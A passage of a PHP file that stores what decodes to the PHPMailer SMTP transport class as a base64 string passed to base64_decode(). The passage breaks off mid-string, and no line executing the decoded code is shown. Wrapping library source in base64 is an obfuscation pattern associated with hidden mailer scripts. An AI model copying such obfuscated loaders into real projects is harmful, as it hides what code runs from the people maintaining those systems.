<?php
$code = base64_decode('PD9waHAKCi8qKgogKiBQSFBNYWlsZXIgUkZDODIxIFNNVFAgZW1haWwgdHJhbnNwb3J0IGNsYXNzLgogKiBQSFAgVmVyc2lvbiA1LjUuCiAqCiAqIEBzZWUgICAgICAgaHR0cHM6Ly9naXRodWIuY29tL1BIUE1haWxlci9QSFBNYWlsZXIvIFRoZSBQSFBNYWlsZXIgR2l0SHViIHByb2plY3QKICoKICogQGF1dGhvciAgICBNYXJjdXMgQm9pbnRvbiAoU3luY2hyby9jb29sYnJ1KSA8cGhwbWFpbGVyQHN5bmNocm9tZWRpYS5jby51az4KICogQGF1dGhvciAgICBKaW0gSmFnaWVsc2tpIChqaW1qYWcpIDxqaW1qYWdAZ21haWwuY29tPgogKiBAYXV0aG9yICAgIEFuZHkgUHJldm9zdCAoY29kZXdvcnh0ZWNoKSA8Y29kZXdvcnh0ZWNoQHVzZXJzLnNvdXJjZWZvcmdlLm5ldD4KICogQGF1dGhvciAgICBCcmVudCBSLiBNYXR6ZWxsZSAob3JpZ2luYWwgZm91bmRlcikKICogQGNvcHlyaWdodCAyMDEyIC0gMjAyMCBNYXJjdXMgQm9pbnRvbgogKiBAY29weXJpZ2h0IDIwMTAgLSAyMDEyIEppbSBKYWdpZWxza2kKICogQGNvcHlyaWdodCAyMDA0IC0gMjAwOSBBbmR5IFByZXZvc3QKICogQGxpY2Vuc2UgICBodHRwczovL3d3dy5nbnUub3JnL2xpY2Vuc2VzL29sZC1saWNlbnNlcy9sZ3BsLTIuMS5odG1sIEdOVSBMZXNzZXIgR2VuZXJhbCBQdWJsaWMgTGljZW5zZQogKiBAbm90ZSAgICAgIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsIC0gV0lUSE9VVAogKiBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZiBNRVJDSEFOVEFCSUxJVFkgb3IKICogRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuCiAqLwoKbmFtZXNwYWNlIFBIUE1haWxlclxQSFBNYWlsZXI7CgovKioKICogUEhQTWFpbGVyIFJGQzgyMSBTTVRQIGVtYWlsIHRyYW5zcG9ydCBjbGFzcy4KICogSW1wbGVtZW50cyBSRkMgODIxIFNNVFAgY29tbWFuZHMgYW5kIHByb3ZpZGVzIHNvbWUgdXRpbGl0eSBtZXRob2RzIGZvciBzZW5kaW5nIG1haWwgdG8gYW4gU01UUCBzZXJ2ZXIuCiAqCiAqIEBhdXRob3IgQ2hyaXMgUnlhbgogKiBAYXV0aG9yIE1hcmN1cyBCb2ludG9uIDxwaHBtYWlsZXJAc3luY2hyb21lZGlhLmNvLnVrPgogKi8KY2xhc3MgU01UUAp7CiAgICAvKioKICAgICAqIFRoZSBQSFBNYWlsZXIgU01UUCB2ZXJzaW9uIG51bWJlci4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBjb25zdCBWRVJTSU9OID0gJzYuMTAuMCc7CgogICAgLyoqCiAgICAgKiBTTVRQIGxpbmUgYnJlYWsgY29uc3RhbnQuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgY29uc3QgTEUgPSAiXHJcbiI7CgogICAgLyoqCiAgICAgKiBUaGUgU01UUCBwb3J0IHRvIHVzZSBpZiBvbmUgaXMgbm90IHNwZWNpZmllZC4KICAgICAqCiAgICAgKiBAdmFyIGludAogICAgICovCiAgICBjb25zdCBERUZBVUxUX1BPUlQgPSAyNTsKCiAgICAvKioKICAgICAqIFRoZSBTTVRQcyBwb3J0IHRvIHVzZSBpZiBvbmUgaXMgbm90IHNwZWNpZmllZC4KICAgICAqCiAgICAgKiBAdmFyIGludAogICAgICovCiAgICBjb25zdCBERUZBVUxUX1NFQ1VSRV9QT1JUID0gNDY1OwoKICAgIC8qKgogICAgICogVGhlIG1heGltdW0gbGluZSBsZW5ndGggYWxsb3dlZCBieSBSRkMgNTMyMSBzZWN0aW9uIDQuNS4zLjEuNiwKICAgICAqICpleGNsdWRpbmcqIGEgdHJhaWxpbmcgQ1JMRiBicmVhay4KICAgICAqCiAgICAgKiBAc2VlIGh0dHBzOi8vd3d3LnJmYy1lZGl0b3Iub3JnL3JmYy9yZmM1MzIxI3NlY3Rpb24tNC41LjMuMS42CiAgICAgKgogICAgICogQHZhciBpbnQKICAgICAqLwogICAgY29uc3QgTUFYX0xJTkVfTEVOR1RIID0gOTk4OwoKICAgIC8qKgogICAgICogVGhlIG1heGltdW0gbGluZSBsZW5ndGggYWxsb3dlZCBmb3IgcmVwbGllcyBpbiBSRkMgNTMyMSBzZWN0aW9uIDQuNS4zLjEuNSwKICAgICAqICppbmNsdWRpbmcqIGEgdHJhaWxpbmcgQ1JMRiBsaW5lIGJyZWFrLgogICAgICoKICAgICAqIEBzZWUgaHR0cHM6Ly93d3cucmZjLWVkaXRvci5vcmcvcmZjL3JmYzUzMjEjc2VjdGlvbi00LjUuMy4xLjUKICAgICAqCiAgICAgKiBAdmFyIGludAogICAgICovCiAgICBjb25zdCBNQVhfUkVQTFlfTEVOR1RIID0gNTEyOwoKICAgIC8qKgogICAgICogRGVidWcgbGV2ZWwgZm9yIG5vIG91dHB1dC4KICAgICAqCiAgICAgKiBAdmFyIGludAogICAgICovCiAgICBjb25zdCBERUJVR19PRkYgPSAwOwoKICAgIC8qKgogICAgICogRGVidWcgbGV2ZWwgdG8gc2hvdyBjbGllbnQgLT4gc2VydmVyIG1lc3NhZ2VzLgogICAgICoKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIGNvbnN0IERFQlVHX0NMSUVOVCA9IDE7CgogICAgLyoqCiAgICAgKiBEZWJ1ZyBsZXZlbCB0byBzaG93IGNsaWVudCAtPiBzZXJ2ZXIgYW5kIHNlcnZlciAtPiBjbGllbnQgbWVzc2FnZXMuCiAgICAgKgogICAgICogQHZhciBpbnQKICAgICAqLwogICAgY29uc3QgREVCVUdfU0VSVkVSID0gMjsKCiAgICAvKioKICAgICAqIERlYnVnIGxldmVsIHRvIHNob3cgY29ubmVjdGlvbiBzdGF0dXMsIGNsaWVudCAtPiBzZXJ2ZXIgYW5kIHNlcnZlciAtPiBjbGllbnQgbWVzc2FnZXMuCiAgICAgKgogICAgICogQHZhciBpbnQKICAgICAqLwogICAgY29uc3QgREVCVUdfQ09OTkVDVElPTiA9IDM7CgogICAgLyoqCiAgICAgKiBEZWJ1ZyBsZXZlbCB0byBzaG93IGFsbCBtZXNzYWdlcy4KICAgICAqCiAgICAgKiBAdmFyIGludAogICAgICovCiAgICBjb25zdCBERUJVR19MT1dMRVZFTCA9IDQ7CgogICAgLyoqCiAgICAgKiBEZWJ1ZyBvdXRwdXQgbGV2ZWwuCiAgICAgKiBPcHRpb25zOgogICAgICogKiBzZWxmOjpERUJVR19PRkYgKGAwYCkgTm8gZGVidWcgb3V0cHV0LCBkZWZhdWx0CiAgICAgKiAqIHNlbGY6OkRFQlVHX0NMSUVOVCAoYDFgKSBDbGllbnQgY29tbWFuZHMKICAgICAqICogc2VsZjo6REVCVUdfU0VSVkVSIChgMmApIENsaWVudCBjb21tYW5kcyBhbmQgc2VydmVyIHJlc3BvbnNlcwogICAgICogKiBzZWxmOjpERUJVR19DT05ORUNUSU9OIChgM2ApIEFzIERFQlVHX1NFUlZFUiBwbHVzIGNvbm5lY3Rpb24gc3RhdHVzCiAgICAgKiAqIHNlbGY6OkRFQlVHX0xPV0xFVkVMIChgNGApIExvdy1sZXZlbCBkYXRhIG91dHB1dCwgYWxsIG1lc3NhZ2VzLgogICAgICoKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIHB1YmxpYyAkZG9fZGVidWcgPSBzZWxmOjpERUJVR19PRkY7CgogICAgLyoqCiAgICAgKiBIb3cgdG8gaGFuZGxlIGRlYnVnIG91dHB1dC4KICAgICAqIE9wdGlvbnM6CiAgICAgKiAqIGBlY2hvYCBPdXRwdXQgcGxhaW4tdGV4dCBhcy1pcywgYXBwcm9wcmlhdGUgZm9yIENMSQogICAgICogKiBgaHRtbGAgT3V0cHV0IGVzY2FwZWQsIGxpbmUgYnJlYWtzIGNvbnZlcnRlZCB0byBgPGJyPmAsIGFwcHJvcHJpYXRlIGZvciBicm93c2VyIG91dHB1dAogICAgICogKiBgZXJyb3JfbG9nYCBPdXRwdXQgdG8gZXJyb3IgbG9nIGFzIGNvbmZpZ3VyZWQgaW4gcGhwLmluaQogICAgICogQWx0ZXJuYXRpdmVseSwgeW91IGNhbiBwcm92aWRlIGEgY2FsbGFibGUgZXhwZWN0aW5nIHR3byBwYXJhbXM6IGEgbWVzc2FnZSBzdHJpbmcgYW5kIHRoZSBkZWJ1ZyBsZXZlbDoKICAgICAqCiAgICAgKiBgYGBwaHAKICAgICAqICRzbXRwLT5EZWJ1Z291dHB1dCA9IGZ1bmN0aW9uKCRzdHIsICRsZXZlbCkge2VjaG8gImRlYnVnIGxldmVsICRsZXZlbDsgbWVzc2FnZTogJHN0ciI7fTsKICAgICAqIGBgYAogICAgICoKICAgICAqIEFsdGVybmF0aXZlbHksIHlvdSBjYW4gcGFzcyBpbiBhbiBpbnN0YW5jZSBvZiBhIFBTUi0zIGNvbXBhdGlibGUgbG9nZ2VyLCB0aG91Z2ggb25seSBgZGVidWdgCiAgICAgKiBsZXZlbCBvdXRwdXQgaXMgdXNlZDoKICAgICAqCiAgICAgKiBgYGBwaHAKICAgICAqICRtYWlsLT5EZWJ1Z291dHB1dCA9IG5ldyBteVBzcjNMb2dnZXI7CiAgICAgKiBgYGAKICAgICAqCiAgICAgKiBAdmFyIHN0cmluZ3xjYWxsYWJsZXxcUHNyXExvZ1xMb2dnZXJJbnRlcmZhY2UKICAgICAqLwogICAgcHVibGljICREZWJ1Z291dHB1dCA9ICdlY2hvJzsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gdXNlIFZFUlAuCiAgICAgKgogICAgICogQHNlZSBodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9WYXJpYWJsZV9lbnZlbG9wZV9yZXR1cm5fcGF0aAogICAgICogQHNlZSBodHRwczovL3d3dy5wb3N0Zml4Lm9yZy9WRVJQX1JFQURNRS5odG1sIEluZm8gb24gVkVSUAogICAgICoKICAgICAqIEB2YXIgYm9vbAogICAgICovCiAgICBwdWJsaWMgJGRvX3ZlcnAgPSBmYWxzZTsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gdXNlIFNNVFBVVEY4LgogICAgICoKICAgICAqIEBzZWUgaHR0cHM6Ly93d3cucmZjLWVkaXRvci5vcmcvcmZjL3JmYzY1MzEKICAgICAqCiAgICAgKiBAdmFyIGJvb2wKICAgICAqLwogICAgcHVibGljICRkb19zbXRwdXRmOCA9IGZhbHNlOwoKICAgIC8qKgogICAgICogVGhlIHRpbWVvdXQgdmFsdWUgZm9yIGNvbm5lY3Rpb24sIGluIHNlY29uZHMuCiAgICAgKiBEZWZhdWx0IG9mIDUgbWludXRlcyAoMzAwc2VjKSBpcyBmcm9tIFJGQzI4MjEgc2VjdGlvbiA0LjUuMy4yLgogICAgICogVGhpcyBuZWVkcyB0byBiZSBxdWl0ZSBoaWdoIHRvIGZ1bmN0aW9uIGNvcnJlY3RseSB3aXRoIGhvc3RzIHVzaW5nIGdyZWV0ZGVsYXkgYXMgYW4gYW50aS1zcGFtIG1lYXN1cmUuCiAgICAgKgogICAgICogQHNlZSBodHRwczovL3d3dy5yZmMtZWRpdG9yLm9yZy9yZmMvcmZjMjgyMSNzZWN0aW9uLTQuNS4zLjIKICAgICAqCiAgICAgKiBAdmFyIGludAogICAgICovCiAgICBwdWJsaWMgJFRpbWVvdXQgPSAzMDA7CgogICAgLyoqCiAgICAgKiBIb3cgbG9uZyB0byB3YWl0IGZvciBjb21tYW5kcyB0byBjb21wbGV0ZSwgaW4gc2Vjb25kcy4KICAgICAqIERlZmF1bHQgb2YgNSBtaW51dGVzICgzMDBzZWMpIGlzIGZyb20gUkZDMjgyMSBzZWN0aW9uIDQuNS4zLjIuCiAgICAgKgogICAgICogQHZhciBpbnQKICAgICAqLwogICAgcHVibGljICRUaW1lbGltaXQgPSAzMDA7CgogICAgLyoqCiAgICAgKiBQYXR0ZXJucyB0byBleHRyYWN0IGFuIFNNVFAgdHJhbnNhY3Rpb24gaWQgZnJvbSByZXBseSB0byBhIERBVEEgY29tbWFuZC4KICAgICAqIFRoZSBmaXJzdCBjYXB0dXJlIGdyb3VwIGluIGVhY2ggcmVnZXggd2lsbCBiZSB1c2VkIGFzIHRoZSBJRC4KICAgICAqIE1TIEVTTVRQIHJldHVybnMgdGhlIG1lc3NhZ2UgSUQsIHdoaWNoIG1heSBub3QgYmUgY29ycmVjdCBmb3IgaW50ZXJuYWwgdHJhY2tpbmcuCiAgICAgKgogICAgICogQHZhciBzdHJpbmdbXQogICAgICovCiAgICBwcm90ZWN0ZWQgJHNtdHBfdHJhbnNhY3Rpb25faWRfcGF0dGVybnMgPSBbCiAgICAgICAgJ2V4aW0nID0+ICcvW1xkXXszfSBPSyBpZD0oLiopLycsCiAgICAgICAgJ3NlbmRtYWlsJyA9PiAnL1tcZF17M30gMlwuMFwuMCAoLiopIE1lc3NhZ2UvJywKICAgICAgICAncG9zdGZpeCcgPT4gJy9bXGRdezN9IDJcLjBcLjAgT2s6IHF1ZXVlZCBhcyAoLiopLycsCiAgICAgICAgJ01pY3Jvc29mdF9FU01UUCcgPT4gJy9bMC05XXszfSAyXC5bXGRdXC4wICguKilAKD86LiopIFF1ZXVlZCBtYWlsIGZvciBkZWxpdmVyeS8nLAogICAgICAgICdBbWF6b25fU0VTJyA9PiAnL1tcZF17M30gT2sgKC4qKS8nLAogICAgICAgICdTZW5kR3JpZCcgPT4gJy9bXGRdezN9IE9rOiBxdWV1ZWQgYXMgKC4qKS8nLAogICAgICAgICdDYW1wYWlnbk1vbml0b3InID0+ICcvW1xkXXszfSAyXC4wXC4wIE9LOihbYS16QS1aXGRdezQ4fSkvJywKICAgICAgICAnSGFyYWthJyA9PiAnL1tcZF17M30gTWVzc2FnZSBRdWV1ZWQgXCgoLiopXCkvJywKICAgICAgICAnWm9uZU1UQScgPT4gJy9bXGRdezN9IE1lc3NhZ2UgcXVldWVkIGFzICguKikvJywKICAgICAgICAnTWFpbGpldCcgPT4gJy9bXGRdezN9IE9LIHF1ZXVlZCBhcyAoLiopLycsCiAgICBdOwoKICAgIC8qKgogICAgICogQWxsb3dlZCBTTVRQIFhDTElFTlQgYXR0cmlidXRlcy4KICAgICAqIE11c3QgYmUgYWxsb3dlZCBieSB0aGUgU01UUCBzZXJ2ZXIuIEVITE8gcmVzcG9uc2UgaXMgbm90IGNoZWNrZWQuCiAgICAgKgogICAgICogQHNlZSBodHRwczovL3d3dy5wb3N0Zml4Lm9yZy9YQ0xJRU5UX1JFQURNRS5odG1sCiAgICAgKgogICAgICogQHZhciBhcnJheQogICAgICovCiAgICBwdWJsaWMgc3RhdGljICR4Y2xpZW50X2FsbG93ZWRfYXR0cmlidXRlcyA9IFsKICAgICAgICAnTkFNRScsICdBRERSJywgJ1BPUlQnLCAnUFJPVE8nLCAnSEVMTycsICdMT0dJTicsICdERVNUQUREUicsICdERVNUUE9SVCcKICAgIF07CgogICAgLyoqCiAgICAgKiBUaGUgbGFzdCB0cmFuc2FjdGlvbiBJRCBpc3N1ZWQgaW4gcmVzcG9uc2UgdG8gYSBEQVRBIGNvbW1hbmQsCiAgICAgKiBpZiBvbmUgd2FzIGRldGVjdGVkLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nfGJvb2x8bnVsbAogICAgICovCiAgICBwcm90ZWN0ZWQgJGxhc3Rfc210cF90cmFuc2FjdGlvbl9pZDsKCiAgICAvKioKICAgICAqIFRoZSBzb2NrZXQgZm9yIHRoZSBzZXJ2ZXIgY29ubmVjdGlvbi4KICAgICAqCiAgICAgKiBAdmFyID9yZXNvdXJjZQogICAgICovCiAgICBwcm90ZWN0ZWQgJHNtdHBfY29ubjsKCiAgICAvKioKICAgICAqIEVycm9yIGluZm9ybWF0aW9uLCBpZiBhbnksIGZvciB0aGUgbGFzdCBTTVRQIGNvbW1hbmQuCiAgICAgKgogICAgICogQHZhciBhcnJheQogICAgICovCiAgICBwcm90ZWN0ZWQgJGVycm9yID0gWwogICAgICAgICdlcnJvcicgPT4gJycsCiAgICAgICAgJ2RldGFpbCcgPT4gJycsCiAgICAgICAgJ3NtdHBfY29kZScgPT4gJycsCiAgICAgICAgJ3NtdHBfY29kZV9leCcgPT4gJycsCiAgICBdOwoKICAgIC8qKgogICAgICogVGhlIHJlcGx5IHRoZSBzZXJ2ZXIgc2VudCB0byB1cyBmb3IgSEVMTy4KICAgICAqIElmIG51bGwsIG5vIEhFTE8gc3RyaW5nIGhhcyB5ZXQgYmVlbiByZWNlaXZlZC4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZ3xudWxsCiAgICAgKi8KICAgIHByb3RlY3RlZCAkaGVsb19ycGx5OwoKICAgIC8qKgogICAgICogVGhlIHNldCBvZiBTTVRQIGV4dGVuc2lvbnMgc2VudCBpbiByZXBseSB0byBFSExPIGNvbW1hbmQuCiAgICAgKiBJbmRleGVzIG9mIHRoZSBhcnJheSBhcmUgZXh0ZW5zaW9uIG5hbWVzLgogICAgICogVmFsdWUgYXQgaW5kZXggJ0hFTE8nIG9yICdFSExPJyAoYWNjb3JkaW5nIHRvIGNvbW1hbmQgdGhhdCB3YXMgc2VudCkKICAgICAqIHJlcHJlc2VudHMgdGhlIHNlcnZlciBuYW1lLiBJbiBjYXNlIG9mIEhFTE8gaXQgaXMgdGhlIG9ubHkgZWxlbWVudCBvZiB0aGUgYXJyYXkuCiAgICAgKiBPdGhlciB2YWx1ZXMgY2FuIGJlIGJvb2xlYW4gVFJVRSBvciBhbiBhcnJheSBjb250YWluaW5nIGV4dGVuc2lvbiBvcHRpb25zLgogICAgICogSWYgbnVsbCwgbm8gSEVMTy9FSExPIHN0cmluZyBoYXMgeWV0IGJlZW4gcmVjZWl2ZWQuCiAgICAgKgogICAgICogQHZhciBhcnJheXxudWxsCiAgICAgKi8KICAgIHByb3RlY3RlZCAkc2VydmVyX2NhcHM7CgogICAgLyoqCiAgICAgKiBUaGUgbW9zdCByZWNlbnQgcmVwbHkgcmVjZWl2ZWQgZnJvbSB0aGUgc2VydmVyLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCAkbGFzdF9yZXBseSA9ICcnOwoKICAgIC8qKgogICAgICogT3V0cHV0IGRlYnVnZ2luZyBpbmZvIHZpYSBhIHVzZXItc2VsZWN0ZWQgbWV0aG9kLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0ciAgIERlYnVnIHN0cmluZyB0byBvdXRwdXQKICAgICAqIEBwYXJhbSBpbnQgICAgJGxldmVsIFRoZSBkZWJ1ZyBsZXZlbCBvZiB0aGlzIG1lc3NhZ2U7IHNlZSBERUJVR18qIGNvbnN0YW50cwogICAgICoKICAgICAqIEBzZWUgU01UUDo6JERlYnVnb3V0cHV0CiAgICAgKiBAc2VlIFNNVFA6OiRkb19kZWJ1ZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZWRlYnVnKCRzdHIsICRsZXZlbCA9IDApCiAgICB7CiAgICAgICAgaWYgKCRsZXZlbCA+ICR0aGlzLT5kb19kZWJ1ZykgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIC8vSXMgdGhpcyBhIFBTUi0zIGxvZ2dlcj8KICAgICAgICBpZiAoJHRoaXMtPkRlYnVnb3V0cHV0IGluc3RhbmNlb2YgXFBzclxMb2dcTG9nZ2VySW50ZXJmYWNlKSB7CiAgICAgICAgICAgIC8vUmVtb3ZlIHRyYWlsaW5nIGxpbmUgYnJlYWtzIHBvdGVudGlhbGx5IGFkZGVkIGJ5IGNhbGxzIHRvIFNNVFA6OmNsaWVudF9zZW5kKCkKICAgICAgICAgICAgJHRoaXMtPkRlYnVnb3V0cHV0LT5kZWJ1ZyhydHJpbSgkc3RyLCAiXHJcbiIpKTsKCiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgLy9Bdm9pZCBjbGFzaCB3aXRoIGJ1aWx0LWluIGZ1bmN0aW9uIG5hbWVzCiAgICAgICAgaWYgKGlzX2NhbGxhYmxlKCR0aGlzLT5EZWJ1Z291dHB1dCkgJiYgIWluX2FycmF5KCR0aGlzLT5EZWJ1Z291dHB1dCwgWydlcnJvcl9sb2cnLCAnaHRtbCcsICdlY2hvJ10pKSB7CiAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jKCR0aGlzLT5EZWJ1Z291dHB1dCwgJHN0ciwgJGxldmVsKTsKCiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgc3dpdGNoICgkdGhpcy0+RGVidWdvdXRwdXQpIHsKICAgICAgICAgICAgY2FzZSAnZXJyb3JfbG9nJzoKICAgICAgICAgICAgICAgIC8vRG9uJ3Qgb3V0cHV0LCBqdXN0IGxvZwogICAgICAgICAgICAgICAgLyoqIEBub2luc3BlY3Rpb24gRm9yZ290dGVuRGVidWdPdXRwdXRJbnNwZWN0aW9uICovCiAgICAgICAgICAgICAgICBlcnJvcl9sb2coJHN0cik7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnaHRtbCc6CiAgICAgICAgICAgICAgICAvL0NsZWFucyB1cCBvdXRwdXQgYSBiaXQgZm9yIGEgYmV0dGVyIGxvb2tpbmcsIEhUTUwtc2FmZSBvdXRwdXQKICAgICAgICAgICAgICAgIGVjaG8gZ21kYXRlKCdZLW0tZCBIOmk6cycpLCAnICcsIGh0bWxlbnRpdGllcygKICAgICAgICAgICAgICAgICAgICBwcmVnX3JlcGxhY2UoJy9bXHJcbl0rLycsICcnLCAkc3RyKSwKICAgICAgICAgICAgICAgICAgICBFTlRfUVVPVEVTLAogICAgICAgICAgICAgICAgICAgICdVVEYtOCcKICAgICAgICAgICAgICAgICksICI8YnI+XG4iOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2VjaG8nOgogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgLy9Ob3JtYWxpemUgbGluZSBicmVha3MKICAgICAgICAgICAgICAgICRzdHIgPSBwcmVnX3JlcGxhY2UoJy9cclxufFxyL20nLCAiXG4iLCAkc3RyKTsKICAgICAgICAgICAgICAgIGVjaG8gZ21kYXRlKCdZLW0tZCBIOmk6cycpLAogICAgICAgICAgICAgICAgIlx0IiwKICAgICAgICAgICAgICAgICAgICAvL1RyaW0gdHJhaWxpbmcgc3BhY2UKICAgICAgICAgICAgICAgIHRyaW0oCiAgICAgICAgICAgICAgICAgICAgLy9JbmRlbnQgZm9yIHJlYWRhYmlsaXR5LCBleGNlcHQgZm9yIHRyYWlsaW5nIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgc3RyX3JlcGxhY2UoCiAgICAgICAgICAgICAgICAgICAgICAgICJcbiIsCiAgICAgICAgICAgICAgICAgICAgICAgICJcbiAgICAgICAgICAgICAgICAgICBcdCAgICAgICAgICAgICAgICAgICIsCiAgICAgICAgICAgICAgICAgICAgICAgIHRyaW0oJHN0cikKICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICApLAogICAgICAgICAgICAgICAgIlxuIjsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBDb25uZWN0IHRvIGFuIFNNVFAgc2VydmVyLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGhvc3QgICAgU01UUCBzZXJ2ZXIgSVAgb3IgaG9zdCBuYW1lCiAgICAgKiBAcGFyYW0gaW50ICAgICRwb3J0ICAgIFRoZSBwb3J0IG51bWJlciB0byBjb25uZWN0IHRvCiAgICAgKiBAcGFyYW0gaW50ICAgICR0aW1lb3V0IEhvdyBsb25nIHRvIHdhaXQgZm9yIHRoZSBjb25uZWN0aW9uIHRvIG9wZW4KICAgICAqIEBwYXJhbSBhcnJheSAgJG9wdGlvbnMgQW4gYXJyYXkgb2Ygb3B0aW9ucyBmb3Igc3RyZWFtX2NvbnRleHRfY3JlYXRlKCkKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNvbm5lY3QoJGhvc3QsICRwb3J0ID0gbnVsbCwgJHRpbWVvdXQgPSAzMCwgJG9wdGlvbnMgPSBbXSkKICAgIHsKICAgICAgICAvL0NsZWFyIGVycm9ycyB0byBhdm9pZCBjb25mdXNpb24KICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJycpOwogICAgICAgIC8vTWFrZSBzdXJlIHdlIGFyZSBfX25vdF9fIGNvbm5lY3RlZAogICAgICAgIGlmICgkdGhpcy0+Y29ubmVjdGVkKCkpIHsKICAgICAgICAgICAgLy9BbHJlYWR5IGNvbm5lY3RlZCwgZ2VuZXJhdGUgZXJyb3IKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCdBbHJlYWR5IGNvbm5lY3RlZCB0byBhIHNlcnZlcicpOwoKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoZW1wdHkoJHBvcnQpKSB7CiAgICAgICAgICAgICRwb3J0ID0gc2VsZjo6REVGQVVMVF9QT1JUOwogICAgICAgIH0KICAgICAgICAvL0Nvbm5lY3QgdG8gdGhlIFNNVFAgc2VydmVyCiAgICAgICAgJHRoaXMtPmVkZWJ1ZygKICAgICAgICAgICAgIkNvbm5lY3Rpb246IG9wZW5pbmcgdG8gJGhvc3Q6JHBvcnQsIHRpbWVvdXQ9JHRpbWVvdXQsIG9wdGlvbnM9IiAuCiAgICAgICAgICAgIChjb3VudCgkb3B0aW9ucykgPiAwID8gdmFyX2V4cG9ydCgkb3B0aW9ucywgdHJ1ZSkgOiAnYXJyYXkoKScpLAogICAgICAgICAgICBzZWxmOjpERUJVR19DT05ORUNUSU9OCiAgICAgICAgKTsKCiAgICAgICAgJHRoaXMtPnNtdHBfY29ubiA9ICR0aGlzLT5nZXRTTVRQQ29ubmVjdGlvbigkaG9zdCwgJHBvcnQsICR0aW1lb3V0LCAkb3B0aW9ucyk7CgogICAgICAgIGlmICgkdGhpcy0+c210cF9jb25uID09PSBmYWxzZSkgewogICAgICAgICAgICAvL0Vycm9yIGluZm8gYWxyZWFkeSBzZXQgaW5zaWRlIGBnZXRTTVRQQ29ubmVjdGlvbigpYAogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQoKICAgICAgICAkdGhpcy0+ZWRlYnVnKCdDb25uZWN0aW9uOiBvcGVuZWQnLCBzZWxmOjpERUJVR19DT05ORUNUSU9OKTsKCiAgICAgICAgLy9HZXQgYW55IGFubm91bmNlbWVudAogICAgICAgICR0aGlzLT5sYXN0X3JlcGx5ID0gJHRoaXMtPmdldF9saW5lcygpOwogICAgICAgICR0aGlzLT5lZGVidWcoJ1NFUlZFUiAtPiBDTElFTlQ6ICcgLiAkdGhpcy0+bGFzdF9yZXBseSwgc2VsZjo6REVCVUdfU0VSVkVSKTsKICAgICAgICAkcmVzcG9uc2VDb2RlID0gKGludClzdWJzdHIoJHRoaXMtPmxhc3RfcmVwbHksIDAsIDMpOwogICAgICAgIGlmICgkcmVzcG9uc2VDb2RlID09PSAyMjApIHsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgIC8vQW55dGhpbmcgb3RoZXIgdGhhbiBhIDIyMCByZXNwb25zZSBtZWFucyBzb21ldGhpbmcgd2VudCB3cm9uZwogICAgICAgIC8vUkZDIDUzMjEgc2F5cyB0aGUgc2VydmVyIHdpbGwgd2FpdCBmb3IgdXMgdG8gc2VuZCBhIFFVSVQgaW4gcmVzcG9uc2UgdG8gYSA1NTQgZXJyb3IKICAgICAgICAvL2h0dHBzOi8vd3d3LnJmYy1lZGl0b3Iub3JnL3JmYy9yZmM1MzIxI3NlY3Rpb24tMy4xCiAgICAgICAgaWYgKCRyZXNwb25zZUNvZGUgPT09IDU1NCkgewogICAgICAgICAgICAkdGhpcy0+cXVpdCgpOwogICAgICAgIH0KICAgICAgICAvL1RoaXMgd2lsbCBoYW5kbGUgNDIxIHJlc3BvbnNlcyB3aGljaCBtYXkgbm90IHdhaXQgZm9yIGEgUVVJVCAoZS5nLiBpZiB0aGUgc2VydmVyIGlzIGJlaW5nIHNodXQgZG93bikKICAgICAgICAkdGhpcy0+ZWRlYnVnKCdDb25uZWN0aW9uOiBjbG9zaW5nIGR1ZSB0byBlcnJvcicsIHNlbGY6OkRFQlVHX0NPTk5FQ1RJT04pOwogICAgICAgICR0aGlzLT5jbG9zZSgpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKioKICAgICAqIENyZWF0ZSBjb25uZWN0aW9uIHRvIHRoZSBTTVRQIHNlcnZlci4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRob3N0ICAgIFNNVFAgc2VydmVyIElQIG9yIGhvc3QgbmFtZQogICAgICogQHBhcmFtIGludCAgICAkcG9ydCAgICBUaGUgcG9ydCBudW1iZXIgdG8gY29ubmVjdCB0bwogICAgICogQHBhcmFtIGludCAgICAkdGltZW91dCBIb3cgbG9uZyB0byB3YWl0IGZvciB0aGUgY29ubmVjdGlvbiB0byBvcGVuCiAgICAgKiBAcGFyYW0gYXJyY